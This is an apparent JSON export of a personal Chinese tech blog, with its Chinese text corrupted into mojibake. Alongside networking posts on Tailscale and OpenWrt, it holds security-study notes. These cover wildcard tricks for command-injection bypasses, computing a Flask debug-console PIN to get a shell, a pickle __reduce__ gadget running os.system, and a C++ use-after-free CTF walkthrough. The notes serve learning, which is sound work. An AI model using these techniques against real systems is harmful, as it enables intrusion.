{"posts":[{"title":"æ‰‹æœºç‰¹å®šåº”ç”¨ ç½‘ç»œåŠ è½½å¡è§£å†³åŠæ³•","content":"ipv6çš„å‘ å…³é—­äº†dhcpï¼Œè”é€šçš„å…‰çŒ« è·¯ç”±å™¨è¿˜æ˜¯ä¼šç»™åˆ†é…ipv6çš„dnsï¼Œç¦»è°±ï¼› ä¸€é€šæ“ä½œåœ¨ç®¡ç†å‘˜åå°å½»åº•å¹²æ‰äº†ipv6çš„dnsï¼Œç»ˆäºè§£å†³é—®é¢˜ ç½‘é€Ÿé£å¿« ğŸ˜ ","link":"https://rainerhu.github.io/post/shou-ji-te-ding-ying-yong-wang-luo-jia-zai-qia-jie-jue-ban-fa/"},{"title":"tailscale åªç”¨ip è‡ªå»ºderper","content":"éšç€derpçš„ä¸æ–­æ›´æ–°ï¼Œç°åœ¨åªæœ‰ipæ²¡æœ‰åŸŸåçš„æƒ…å†µä¸‹æ­å»ºå·²ç»ç®€å•å¾ˆå¤šäº†ã€‚ derpå®‰è£…å°±ä¸è¯¦ç»†è¯´äº†ï¼Œç›´æ¥çœ‹å®˜ç½‘è‡ªå·±è£…å°±å®Œäº‹ï¼Œ æˆ‘è‡ªå·±æ˜¯ä½¿ç”¨äº†å¤§ä½¬åšçš„å®¹å™¨ç‰ˆæœ¬çš„ fredliang/derper ,å¤§å®¶ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ª è¯ä¹¦ç”Ÿæˆ ç”±äºæ²¡æœ‰åŸŸåï¼Œå°±è¦å…ˆè‡ªå·±ç”Ÿæˆä¸ªè¯ä¹¦å‡ºæ¥äº†ï¼Œç”±äºæˆ‘æ˜¯æŠŠderpéƒ¨ç½²åœ¨è‡ªå·±å®¶é‡Œï¼Œæ‹¨å·ipä¼šå˜åŒ–ï¼Œæ‰€ç”¨äº†DDNSï¼Œè¿™é‡Œç”ŸæˆåŸŸåå°±è¦ç”¨DDNSä½¿ç”¨çš„åŸŸåæ¥ç”Ÿæˆè¯ä¹¦ æ³¨æ„ï¼š è¦æ›¿æ¢ é‡Œé¢çš„åŸŸåç”¨è‡ªå·±çš„ï¼Œå½“ç„¶å¦‚æœæœ‰å›ºå®šçš„å…¬ç½‘ipä¹Ÿå¯ä»¥ç›´æ¥ç”¨ipæ¥æï¼Œåº”è¯¥é—®é¢˜ä¸å¤§ï¼Œè¯ä¹¦ç”Ÿæˆå‘½ä»¤å¿˜è®°æ˜¯ä»å“ªé‡ŒæŠ„çš„äº†..... openssl genrsa -out ca.key 2048 openssl req -new -x509 -days 365 -key ca.key -subj &quot;/C=CN/ST=GD/L=SZ/O=Acme, Inc./CN=Acme Root CA&quot; -out ca.crt # ä¸‹é¢çš„å‘½ä»¤è¦æ›¿æ¢*.example.org openssl req -newkey rsa:2048 -nodes -keyout xxx.example.org.key -subj &quot;/C=CN/ST=GD/L=SZ/O=Acme, Inc./CN=*.example.org&quot; -out server.csr # ä¸‹é¢çš„å‘½ä»¤è¦æ›¿æ¢xxx.example.org openssl x509 -req -extfile &lt;(printf &quot;subjectAltName=DNS:example.com,DNS:xxx.example.org&quot;) -days 365 -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out xxx.example.org.crt å¯åŠ¨å®¹å™¨ ç„¶åå°±æ˜¯å·¨é•¿çš„å¯åŠ¨å®¹å™¨å‘½ä»¤ ï¼Œè¿™é‡Œç”¨äº†æ¯”è¾ƒå¤šçš„å‚æ•° ï¼Œé€ä¸€è§£é‡Šä¸‹ï¼š --restart always ï¼š å®¹å™¨è‡ªåŠ¨é‡å¯ --net=container:gw : å’Œå…¶ä»–å®¹å™¨å…±äº«ç½‘ç»œï¼Œè¿™æ ·å­derpå¼€æ”¾çš„ç«¯å£å°±ä¼šå¼€åœ¨æˆ‘çš„ç½‘å…³å®¹å™¨ä¸Šï¼Œè¿™ä¸ªå¤§å®¶è§†æƒ…å†µä½¿ç”¨ï¼Œæˆ‘æ˜¯å› ä¸ºè‡ªå·±æäº†ä¸ªå®¹å™¨åšç½‘å…³ï¼Œä¸“é—¨ç”¨æ¥æ˜ å°„ç«¯å£åˆ°å…¬ç½‘ä¸Šï¼Œç„¶åæœ¬æ¥æƒ³è¦åœ¨gwçš„å®¹å™¨ä¸Šé…ç½®iptableåšç«¯å£è½¬å‘åˆ°è·‘derpçš„å®¹å™¨ä¸Šï¼Œä½†æ˜¯ç ”ç©¶äº†ä¸€å¤©ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆudpéƒ½æ˜¯åªæœ‰æ”¶åˆ°çš„åŒ…ï¼Œè½¬å‘ä¸å‡ºå»å•Šï¼Œç»æœ›ã€‚ã€‚ã€‚ï¼Œæ— å¥ˆæäº†è¿™ä¹ˆä¸ªéªšæ“ä½œï¼Œç›´æ¥å’Œç½‘å…³å®¹å™¨å…±äº«ç½‘ç»œäº†ï¼Œç½‘ç»œçŸ¥è¯†è¿˜æ˜¯ä¸å¤Ÿã€‚ã€‚æä¸æ‡‚ä¸ºå•¥ -v /root/cert:/root/certï¼š æŒ‚è½½è¯ä¹¦ç›®å½• -v /var/lib/tailscale:/var/lib/tailscale -v /var/run/tailscale:/var/run/tailscale ï¼š æŒ‚è½½ç›®å½•åˆ°å®¹å™¨ï¼Œä¸ºäº†æ‰“å¼€derpå¯¹å®¢æˆ·ç«¯çš„æ ¡éªŒï¼Œå› æ­¤éœ€è¦æŒ‚è½½ï¼Œä¸è¿‡å¥½åƒåªç”¨æŒ‚è½½ç¬¬äºŒä¸ªå°±è¡Œäº† -e DERP_VERIFY_CLIENTS=true ï¼š å¼€å¯--verify-clientsçš„æ ¡éªŒ -e DERP_HTTP_PORT=-1 ï¼š ç¦ç”¨httpç«¯å£ï¼Œå°‘å¼€ç‚¹ç«¯å£ï¼Œå®‰å…¨ -e DERP_DOMAIN=xxx.example.org ï¼šè®¾ç½®è‡ªå·±çš„åŸŸå -e DERP_CERT_MODE=manual: è®¾ç½®è¯ä¹¦æ¨¡å¼ï¼Œä¸ºè‡ªå·±æŒ‡å®šçš„è¯ä¹¦ -e DERP_CERT_DIR=/root/cert :æŒ‡å®šè¯ä¹¦ç›®å½• -e DERP_ADDR=:448 ï¼š æŒ‡å®šå¼€æ”¾çš„httpsç«¯å£ --name=derp ï¼š ç»™å®¹å™¨èµ·åå­— docker run -d --restart always --net=container:gw -v /root/cert:/root/cert -v /var/lib/tailscale:/var/lib/tailscale -v /var/run/tailscale:/var/run/tailscale -e DERP_VERIFY_CLIENTS=true -e DERP_HTTP_PORT=-1 -e DERP_DOMAIN=xxx.example.org -e DERP_CERT_MODE=manual -e DERP_CERT_DIR=/root/cert -e DERP_ADDR=:448 --name=derp fredliang/derper:5.26 ä¿®æ”¹ACLè§„åˆ™ ACLè§„åˆ™æœ‰ä¸¤ä¸ªåœ°æ–¹æ¯”è¾ƒé‡è¦ï¼Œä¸€ä¸ªæ˜¯æˆ‘æ”¹äº†httpsçš„ç«¯å£ï¼Œæ²¡æœ‰ç”¨é»˜è®¤çš„ï¼Œä¸€å®šè¦åŠ ä¸Šï¼Œè¿˜æœ‰å°±æ˜¯ InsecureForTests ï¼Œå¿½ç•¥æ‰è¯ä¹¦é”™è¯¯ï¼Œä¸ç„¶å°±è¿æ¥ä¸ä¸Šå»äº†ï¼ˆå¦‚æœä½ çš„è¯ä¹¦ä¸æ˜¯è‡ªå·±è‡ªç­¾åçš„ï¼Œè€Œæ˜¯çœŸçš„è¯ï¼Œå°±ä¸ç”¨åŠ è¿™ä¸ªäº†ï¼‰ å‚è€ƒç¤ºä¾‹ï¼š &quot;derpMap&quot;: { &quot;OmitDefaultRegions&quot;: false, &quot;Regions&quot;: { &quot;900&quot;: { &quot;RegionID&quot;: 900, &quot;RegionCode&quot;: &quot;home&quot;, &quot;RegionName&quot;: &quot;home&quot;, &quot;Nodes&quot;: [{ &quot;Name&quot;: &quot;1&quot;, &quot;RegionID&quot;: 900, &quot;HostName&quot;: &quot;xxx.example.org&quot;, &quot;DERPPort&quot;: 448, //æŒ‡å®šhttpsç«¯å£ &quot;InsecureForTests&quot;: true, // å¿½ç•¥è¯ä¹¦é”™å¤± }], }, }, } æ€ä¹ˆæDDNSè¿™é‡Œå°±ä¸è¯¦ç»†å†™äº† ","link":"https://rainerhu.github.io/post/tailscale-zhi-yong-ip-zi-jian-derper/"},{"title":"sqlitä½¿ç”¨æ—¶æ³¨æ„å†…å­˜æ³„éœ²","content":"sqlitä½¿ç”¨æ—¶æ³¨æ„å†…å­˜æ³„éœ² sqliteå†…å­˜æ³„éœ² sqlite3_get_table------sqlite3_free_table(pazResult) sqlite3_exec-----sqlite3_free(*errmsg) (å‡ºç°é”™è¯¯çš„æƒ…å†µä¸‹è¦è°ƒç”¨) sqlite3_open-------sqlite3_close ","link":"https://rainerhu.github.io/post/sqlit-shi-yong-shi-zhu-yi-nei-cun-xie-lu1/"},{"title":"å‘½ä»¤æ³¨å…¥éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦","content":"ç›®å½•ç©¿è¶Š cd .?/.?/ cd .[[:punct:]]/ cd .[[:print:]]/ cd .[^1]/ shellé€šé…ç¬¦å®ç°ç›®å½•ç©¿è¶Š å­—ç¬¦ è§£é‡Š * åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦ ? åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ [list] åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ [^list] åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ [!list] åŒ[^list] {str1,str2,â€¦} åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ IFS ç”± &lt; space &gt; æˆ– &lt; tab &gt; æˆ– &lt; enter &gt; ä¸‰è€…ä¹‹ä¸€ç»„æˆ CR ç”± &lt; enter &gt; äº§ç”Ÿ ! æ‰§è¡Œ history ä¸­çš„å‘½ä»¤ ä¸“ç”¨å­—ç¬¦é›† å­—ç¬¦ æ„ä¹‰ [:alnum:] ä»»æ„æ•°å­—æˆ–è€…å­—æ¯ [:alpha:] ä»»æ„å­—æ¯ [:space:] ç©ºæ ¼ [:lower:] å°å†™å­—æ¯ [:digit:] ä»»æ„æ•°å­— [:upper:] ä»»æ„å¤§å†™å­—æ¯ [:cntrl:] æ§åˆ¶ç¬¦ [:graph:] å›¾å½¢ [:print:] å¯æ‰“å°å­—ç¬¦ [:punct:] æ ‡ç‚¹ç¬¦å· [:xdigit:] åå…­è¿›åˆ¶æ•° [:blank:] ç©ºç™½å­—ç¬¦ åœ¨ä½¿ç”¨ä¸“å±å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå­—ç¬¦é›†ä¹‹å¤–è¿˜éœ€è¦ç”¨ [ ] æ¥åŒ…å«ä½ï¼Œå¦åˆ™ä¸“ç”¨å­—ç¬¦é›†ä¸ä¼šç”Ÿæ•ˆï¼Œä¾‹å¦‚[[:space:]] ","link":"https://rainerhu.github.io/post/ming-ling-zhu-ru-bu-fen-te-shu-zi-fu/"},{"title":"python-flask debugæ¨¡å¼ pinç è®¡ç®—","content":" é‡åˆ°äº†flaskåœ¨ç”Ÿäº§ç¯å¢ƒå¼€debugæ¨¡å¼çš„...å­¦ä¹ ä¸€ä¸‹æ€ä¹ˆåˆ©ç”¨ flask debugæ¨¡å¼ getshell https://www.freebuf.com/articles/network/238485.html https://www.cnblogs.com/HacTF/p/8160076.html https://github.com/its-arun/Werkzeug-Debug-RCE/blob/master/werkzeug.py æºç  https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/init.py ç›´æ¥è¿›å…¥ xx.xx.xx.xx/console å¯è®¿é—®debugæ§åˆ¶å°é¡µé¢ éœ€è¦çš„å‚æ•°å€¼ probably_public_bits = [ 'admin',# username import getpass username=getpass.getuser() 'flask.app',# modname getattr(app, &quot;__module__&quot;, app.__class__.__module__) 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/lib64/python2.7/site-packages/flask/app.pyc' # getattr(sys.modules.get(modname), '__file__', None) ] private_bits = [ '280362549456921',# str(uuid.getnode()), /sys/class/net/eth0/address ç½‘å¡macåœ°å€ str(0x4545454545) '54aea375-c51c-4a6a-95a8-9cf4727caadc'# get_machine_id()ï¼š /etc/machine-id or /proc/sys/kernel/random/boot_id + /proc/self/cgroupï¼ˆç¬¬ä¸€è¡Œæœ€åä¸€ä¸ª/åçš„ä¸€æ®µï¼‰ ] python3æ˜¯app.py python2æ˜¯app.pyc /proc/self/cgroup å†…å®¹ä¼šéšç€æ¯ä¸ªç»ˆç«¯å‘ç”Ÿå˜åŒ– å–ç¬¬ä¸€è¡Œï¼Œæœ€åä¸€ä¸ª / åçš„å­—ç¬¦å†…å®¹ï¼Œæ‹¼æ¥åˆ°ä»å‰é¢ä¸¤ä¸ªæ–‡ä»¶è¯»åˆ°çš„å†…å®¹ è¯¥å¤„ä¸ºsession-6042.scope 11:memory:/user.slice/user-0.slice/session-6042.scope 10:perf_event:/ 9:devices:/user.slice 8:freezer:/ 7:rdma:/ 6:pids:/user.slice/user-0.slice/session-6042.scope 5:blkio:/ 4:net_cls,net_prio:/ 3:cpu,cpuacct:/ 2:cpuset:/ 1:name=systemd:/user.slice/user-0.slice/session-6042.scope 0::/user.slice/user-0.slice/session-6042.scope https://github.com/pallets/werkzeug/commit/11ba286a1b907110a2d36f5c05740f239bc7deed è¯¥æäº¤ä¿®æ”¹äº†è®¡ç®—pinæ–¹å¼ï¼Œä½¿ç”¨sha1ï¼Œä¸å†ä½¿ç”¨md5ï¼Œç”Ÿæˆpinçš„ä»£ç è¿˜æ˜¯éœ€è¦æ ¹æ®ç‰ˆæœ¬å°è¯•æ‰å¯ä»¥ã€‚ã€‚ ","link":"https://rainerhu.github.io/post/python-flask-debug-mo-shi-pin-ma-ji-suan/"},{"title":"æ ‘è“æ´¾ï¼šopenwrtæ­å»º","content":"æ ‘è“æ´¾é•œåƒé€‰æ‹© https://github.com/openfans-community-offical/Debian-Pi-Aarch64 é€‰ç”¨æ— æ¡Œé¢åŠ å¼ºç‰ˆ çš„é•œåƒå°±å¯ä»¥ OPENFANS-Debian-Buster-Desktop-Aarch64-XXXXXX.img ä¸éœ€è¦åœ¨è‡ªå·±å®‰è£…å¾ˆå¤šä¸œè¥¿ï¼ŒåŸºæœ¬éƒ½å®‰è£…å¥½äº† openwrt docker ä¸‹åˆ—ä¸¤ä¸ªéƒ½å¯ä»¥ https://hub.docker.com/r/buddyfly/openwrt-aarch64 https://hub.docker.com/r/sulinggg/openwrt æ ‘è“æ´¾ç½‘ç»œé…ç½® å¼€å¯ç½‘å¡æ··æ‚æ¨¡å¼ sudo ip link set eth0 promisc on docker ç½‘ç»œåˆ›å»º docker network create -d macvlan --subnet=192.168.8.0/24 --gateway=192.168.8.1 -o parent=eth0 macnet å¯æ‰§è¡Œ docker network ls æŸ¥çœ‹åˆ›å»ºçš„ç½‘ç»œ å…³äºmacvlanç›¸å…³å†…å®¹ä¸‹é¢è¡¥å……ï¼Œå¤§æ¦‚å°±æ˜¯ä¸€ä¸ªæ¡¥æ¥å§ï¼Œä½†æ˜¯åˆæœ‰åŒºåˆ« 3. æ‹‰å–é•œå¹¶å¯åŠ¨å®¹å™¨ docker pull buddyfly/openwrt-aarch64 #æ‹‰å–é•œåƒ docker run --restart always --name openwrt -d --network macnet --privileged buddyfly/openwrt-aarch64 /sbin/init #å¯åŠ¨å®¹å™¨ï¼Œè‡ªåŠ¨é‡å¯ï¼Œå‘½åå®¹å™¨åï¼Œåå°è¿è¡Œï¼ŒåŠ å…¥macnetç½‘ç»œï¼Œå®¹å™¨å†…å‘½ä»¤æ‰§è¡Œæƒé™ï¼Œå®šä¹‰å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„å‘½ä»¤ è¿›å…¥å®¹å™¨ä¿®æ”¹ç½‘ç»œ docker exec -it openwrt bash #è¿›å…¥å®¹å™¨bashç•Œé¢ vi /etc/config/network config interface 'loopback' option ifname 'lo' option proto 'static' option ipaddr '127.0.0.1' option netmask '255.0.0.0' config globals 'globals' option ula_prefix 'fd5d:af65:56ed::/48' config interface 'lan' option type 'bridge' option ifname 'eth0' option proto 'static' option ipaddr '192.168.8.10' option netmask '255.255.255.0' option ip6assign '60' option gateway '192.168.8.1' option dns '192.168.8.1' é‡å¯ç½‘ç»œ /etc/init.d/network restart #é‡å¯openwrtçš„ç½‘ç»œ æ ‘è“æ´¾ç½‘ç»œé…ç½® /etc/network/interfaces # interfaces(5) file used by ifup(8) and ifdown(8) # Include files from /etc/network/interfaces.d: source-directory /etc/network/interfaces.d ## Used dhcp ip address set eth0 inet to dhcp, ## or used static ip address set eth0 to static ## and change other ip settings. ## If you wanna let settings to take effect, ## uncomment symbol in front. auto eth0 allow-hotplug eth0 #iface eth0 inet dhcp iface eth0 inet static address 192.168.8.103 netmask 255.255.255.0 gateway 192.168.8.1 dns-nameservers 192.168.8.10 ä¿®æ”¹openwrté…ç½® é»˜è®¤å¯†ç ï¼šroot-password å…³é—­DHCPï¼Œipv6çš„ä¹Ÿè¦å…³æ‰ å¼€æœºå¯åŠ¨è„šæœ¬ä¿®æ”¹ åœ¨/boot/rc-localä¸­åŠ å…¥ä¸‹é¢çš„ï¼Œæ¥è®©æ ‘è“æ´¾æœ¬èº«çš„æµé‡ä¹Ÿèµ°openwrt æ²¡æœ‰è¿™ä¸ªéœ€æ±‚çš„ä¸æ”¹ä¹Ÿè¡Œ ip link add link eth0 dev eth0.01 type macvlan mode bridge sleep 10 ifconfig eth0.01 192.168.8.11/24 route add 192.168.8.10 dev eth0.01 route add default gw 192.168.8.10 dev eth0.01 --macvlançš„è§£é‡Š-2021.07.07æ›´æ–° macvlan åœ¨ç¬¬ä¸€æ­¥ä¸­æœ‰åˆ›å»º dockerä½¿ç”¨çš„macvlanï¼Œç›®çš„æ˜¯ä¸ºäº†å®ç°å’Œæ¡¥æ¥ä¸€æ ·çš„æ¨¡å¼ï¼Œå…±äº«ç‰©ç†ç½‘å¡ä½¿ç”¨çš„å¤–éƒ¨ç½‘ç»œã€‚ä½¿ç”¨äº†bridgeæ¨¡å¼ã€‚ è¯¥æ¨¡å¼ä¸‹è™šæ‹Ÿå‡ºæ¥çš„ç½‘å¡æ˜¯æ— æ³•ç›´æ¥ä¸çˆ¶ç½‘å¡é€šä¿¡çš„ï¼Œå› æ­¤æ ‘è“æ´¾æœ¬èº«çš„æµé‡æ— æ³•åˆ°è¾¾openwrt ä¸ºäº†èƒ½å¤Ÿè®©æ ‘è“æ´¾æœ¬èº«çš„æµé‡ä¹Ÿç»è¿‡openwrtå‡ºå»ï¼Œæ‰€ä»¥åé¢é‡æ–°åˆ›å»ºäº†ä¸€å—è™šæ‹Ÿç½‘å¡ï¼Œå¹¶ä¿®æ”¹è·¯ç”±ï¼ŒæŒ‡å®šé»˜è®¤ç½‘å…³åˆ°openwrtçš„ipï¼ŒåŒæ—¶æŒ‡å®šè¯¥è·¯ç”±ç½‘å¡ä½¿ç”¨è™šæ‹Ÿç½‘å¡ ","link":"https://rainerhu.github.io/post/shu-mei-pai-openwrt-da-jian/"},{"title":"python pickle","content":"æ§åˆ¶å¦‚ä½•ååºåˆ—åŒ– __reduce__ __reduce_ex__ æŒ‡å®špickleåè®®ç‰ˆæœ¬ class Test(object): def __reduce__(self): cmd = &quot;whoami&quot; #return __import__('os').system,('whoami',) return (os.system,('whoami',)) __reduce__ex__ é™åˆ¶å…¨å±€å˜é‡ find_class https://docs.python.org/zh-cn/3/library/pickle.html#pickle-restrict import builtins import io import pickle safe_builtins = { 'range', 'complex', 'set', 'frozenset', 'slice', } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &quot;builtins&quot; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; % (module, name)) def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load() ","link":"https://rainerhu.github.io/post/python-pickle/"},{"title":"UAF","content":"ç®€ä»‹ use after freeï¼Œå³é‡Šæ”¾åé‡ç”¨ã€‚æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œåœ¨äºå†…å­˜åœ¨è¢«é‡Šæ”¾åï¼Œä½†æ˜¯æŒ‡å‘æŒ‡é’ˆå¹¶æ²¡æœ‰è¢«åˆ é™¤ï¼Œåˆè¢«ç¨‹åºè°ƒç”¨ã€‚æ¯”è¾ƒå¸¸è§çš„ç±»å‹æ˜¯C++å¯¹è±¡ï¼Œåˆ©ç”¨UAFä¿®æ”¹C++çš„è™šå‡½æ•°è¡¨å¯¼è‡´çš„ä»»æ„ä»£ç æ‰§è¡Œã€‚ è™šå‡½æ•° åœ¨C++ä¸­ï¼Œå¦‚æœç±»ä¸­æœ‰è™šå‡½æ•°ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šæœ‰ä¸€ä¸ªè™šå‡½æ•°è¡¨çš„æŒ‡é’ˆ__vfptrï¼Œåœ¨ç±»å¯¹è±¡æœ€å¼€å§‹çš„å†…å­˜æ•°æ®ä¸­ã€‚ä¹‹åæ˜¯ç±»ä¸­çš„æˆå‘˜å˜é‡çš„å†…å­˜æ•°æ®ï¼Œè™šå‡½æ•°æŒ‡é’ˆæŒ‡å‘è™šå‡½æ•°è¡¨ å¯¹äºå­ç±»ï¼Œæœ€å¼€å§‹çš„å†…å­˜æ•°æ®è®°å½•ç€çˆ¶ç±»å¯¹è±¡çš„æ‹·è´ï¼ˆåŒ…æ‹¬çˆ¶ç±»è™šå‡½æ•°è¡¨æŒ‡é’ˆå’Œæˆå‘˜å˜é‡ï¼‰ã€‚ ä¹‹åæ˜¯å­ç±»è‡ªå·±çš„æˆå‘˜å˜é‡æ•°æ® #include &lt;iostream&gt; class A{ public: int a; A():a(0x1) {} virtual void foo(){ std::cout &lt;&lt; &quot;A::foo()&quot; &lt;&lt; std::endl; } void bar(){ std::cout &lt;&lt; &quot;A::bar()&quot; &lt;&lt; std::endl; } }; class B: public A{ public: int b; B():A(),b(0x2) {} void foo(){ std::cout &lt;&lt; &quot;B::foo()&quot; &lt;&lt; std::endl; } }; class C: public B{ public: int c; C():B(),c(0x3) {} void foo(){ std::cout &lt;&lt; &quot;C::foo()&quot; &lt;&lt; std::endl; } }; int main() { A a; B b; C c; B *p = &amp;c; p-&gt;foo(); std::cout &lt;&lt; sizeof(int) &lt;&lt; &quot; &quot; &lt;&lt; sizeof(int*) &lt;&lt; std::endl; return 0; } (gdb) p a $1 = {_vptr.A = 0x555555557d90 &lt;vtable for A+16&gt;, a = 1} (gdb) p b $2 = {&lt;A&gt; = {_vptr.A = 0x555555557d78 &lt;vtable for B+16&gt;, a = 1}, b = 2} (gdb) p c $3 = {&lt;B&gt; = {&lt;A&gt; = {_vptr.A = 0x555555557d60 &lt;vtable for C+16&gt;, a = 1}, b = 2}, c = 3} SLAB &amp;&amp; SLUB å†…å­˜ç®¡ç†æœºåˆ¶ï¼ŒSLABè¦æ±‚ç³»ç»Ÿæš‚æ—¶ä¿ç•™å·²ç»é‡Šæ”¾çš„å†…æ ¸å¯¹è±¡ç©ºé—´ï¼Œä»¥ä¾¿ä¸‹æ¬¡ç”³è¯·æ—¶ä¸éœ€è¦å†æ¬¡åˆå§‹åŒ–å’Œåˆ†é…;ä½†æ˜¯ï¼ŒSLABæœºåˆ¶å¯¹å†…æ ¸å¯¹è±¡çš„ç±»å‹ååˆ†æŒ‘å‰”ï¼Œåªæœ‰ç±»å‹å’Œå¤§å°éƒ½å®Œå…¨ä¸€è‡´çš„å¯¹è±¡æ‰èƒ½é‡ç”¨å…¶ç©ºé—´;è¿™å°±å¥½æ¯”æ˜¯è£…è¿‡é¸¡çš„ç¬¼å­æ˜¯ä¸å…è®¸å†å»å…³å…”å­äº†,å“ªæ€•é¸¡å’Œå…”å­çš„å¤§å°ä¸€æ ·; ä½†æ˜¯,å’ŒSLABç›¸æ¯”,SLUBå¯¹å¯¹è±¡ç±»å‹å°±æ²¡æœ‰é™åˆ¶,ä¸¤ä¸ªå¯¹è±¡åªè¦å¤§å°å·®ä¸å¤šå°±å¯ä»¥é‡ç”¨åŒä¸€å—å†…å­˜,è€Œä¸åœ¨ä¹ç±»å‹æ˜¯å¦ç›¸åŒ; ç¤ºä¾‹ä»£ç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { char *p1; p1 = (char *) malloc(sizeof(char)*10); memcpy(p1,&quot;hello&quot;,10); printf(&quot;p1 addr:%x,%s\\n&quot;,p1,p1); free(p1); char *p2; p2 = (char *)malloc(sizeof(char)*10); //ç”³è¯·åŒæ ·å¤§å°çš„å†…å­˜ memcpy(p1,&quot;world&quot;,10); //å‘p1ä¸­æ‹·è´ printf(&quot;p2 addr:%x,%s\\n&quot;,p2,p2);// è¾“å‡ºp2 return 0; } è¾“å‡º p1 addr:d21260,hello p2 addr:d21260,world CTF-ç¤ºä¾‹ #include &lt;fcntl.h&gt; #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;unistd.h&gt; using namespace std; class Human{ private: virtual void give_shell(){ system(&quot;/bin/sh&quot;); } protected: int age; string name; public: virtual void introduce(){ cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1){ cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } æœ‰ä¸‰ä¸ªç±»ï¼ŒManå’ŒWomanéƒ½æ˜¯ç»§æ‰¿äº†Humanç±»ï¼Œå¹¶ä¸”å¯ä»¥çœ‹å‡ºåªè¦æˆ‘ä»¬å°†æ§åˆ¶æµåŠ«æŒåˆ°Humanç±»çš„ç§æœ‰è™šå‡½æ•°give_shellï¼Œå°±èƒ½getshelläº†ã€‚ å¯ä»¥æ ¹æ®ä»£ç çœ‹å‡ºæ¥ï¼Œè¦æƒ³åˆ©ç”¨UAFï¼Œå°±è¦å…ˆé€‰freeï¼Œç„¶åafterï¼Œå†useã€‚ æˆ‘ä»¬é¦–å…ˆè¦çœ‹ä¸‹è¦ç”³è¯·å¤šå¤§çš„å†…å­˜ç©ºé—´åˆé€‚ï¼Œå¯ä»¥æŠŠè¿™ä¸ªä»£ç ç¼–è¯‘ä¸€ä¸‹ï¼Œä¹‹åç”¨IDAåæ±‡ç¼–çœ‹ä¸‹ä¼ªä»£ç ,å¯ä»¥çœ‹åˆ°éœ€è¦0x30ï¼Œå°±æ˜¯48çš„å†…å­˜ã€‚è¿™ä¸ªç»“æœä¼šå› ç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨çš„ç³»ç»Ÿä¸åŒå­˜åœ¨å·®å¼‚ï¼Œè¿™ä¸ªCTFé¢˜åŸæœ¬ç»™çš„ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºåæ±‡ç¼–å°±æ˜¯0x18çš„ï¼Œæ˜¯24 v3 = (Man *)operator new(0x30uLL); Man::Man(v3, &amp;p_name, 25); m = v3; ä¹Ÿå¯ä»¥ç”¨gdbè°ƒè¯•çœ‹åˆ°å¤§å°æ˜¯48 Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54 54 cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; (gdb) p *m $1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;} (gdb) p sizeof(*m) $2 = 48 ç„¶åæ‰¾åˆ°introduceè°ƒç”¨çš„åœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æ ¹æ®è™šå‡½æ•°æŒ‡é’ˆï¼Œç„¶å+1è°ƒç”¨åˆ°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ˜¯æƒ³è°ƒç”¨åˆ°given_shell å°±æ˜¯è¦è¦†ç›–æ”¹å†™è™šå‡½æ•°æŒ‡é’ˆçš„å€¼ (*((void (__fastcall **)(Human *))m-&gt;_vptr_Human + 1))(m); (*((void (__fastcall **)(Human *))w-&gt;_vptr_Human + 1))(w); ç„¶åå¯»æ‰¾man è™šå‡½æ•°è¡¨ã€‚æ‰¾åˆ°mançš„æ„é€ å‡½æ•° void __cdecl Man::Man(Man *const this, std::string *p_name, int age) { Human::Human(this); 